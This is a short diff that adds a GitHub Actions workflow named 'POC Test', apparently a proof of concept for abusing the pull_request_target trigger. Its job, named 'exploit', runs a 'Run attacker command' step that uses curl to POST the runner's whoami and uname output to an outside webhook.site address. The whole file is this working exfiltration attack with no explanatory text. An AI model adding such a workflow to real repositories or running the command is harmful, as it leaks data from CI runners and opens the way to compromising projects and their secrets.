@@ -1,0 +1,12 @@
+name: POC Test
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run attacker command
+        run: |
+          curl -X POST -d "WHOAMI=$(whoami)&UNAME=$(uname -a)" https://webhook.site/ef36781f-5c6e-49a7-b232-b8d6e36e2867
